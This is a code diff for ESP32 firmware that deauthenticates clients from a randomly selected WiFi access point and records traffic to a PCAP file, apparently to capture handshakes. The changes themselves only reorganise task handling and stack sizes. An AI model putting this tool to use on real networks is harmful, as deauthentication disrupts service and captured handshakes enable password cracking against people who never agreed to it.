@@ -147,7 +147,7 @@ void deauth_clients() {
     }
     vTaskDelay(pdMS_TO_TICKS(15000)); // Wait for some more packets for nonce correction
     ESP_LOGI(TAG, "Deauth completed for %d clients.", station_count);
-    close_pcap_writer(); // Close PCAP writer after deauth
+    xTaskNotifyGive(close_task_handle); // Close PCAP writer after deauth
 }
 
 void selectAP(void) {
@@ -179,6 +179,7 @@ void selectAP(void) {
     esp_wifi_start();
     esp_wifi_set_channel(ap_list[random_index].channel, WIFI_SECOND_CHAN_NONE);
     start_pcap_writer(); // Start PCAP writer
+    xTaskCreate(close_task, "close_task", 8092, NULL, 5, &close_task_handle);
     deauth_clients();
     ESP_LOGI(TAG, "Deauth sent to selected AP: %02X:%02X:%02X:%02X:%02X:%02X",
              selected_ap_bssid[0], selected_ap_bssid[1], selected_ap_bssid[2],
@@ -228,6 +229,6 @@ void app_main(void) {
                                                         WIFI_PROMIS_FILTER_MASK_MGMT};
     ESP_ERROR_CHECK(esp_wifi_set_promiscuous_filter(&filter));
     ESP_ERROR_CHECK(esp_wifi_set_promiscuous_rx_cb(&wifi_sniffer_packet_handler));
-    xTaskCreate(channel_hopper_task, "channel_hopper_task", 4096, NULL, 1, NULL);
+    xTaskCreate(channel_hopper_task, "channel_hopper_task", 8192, NULL, 1, NULL);
     ESP_LOGI(TAG, "Sniffer started");
 }
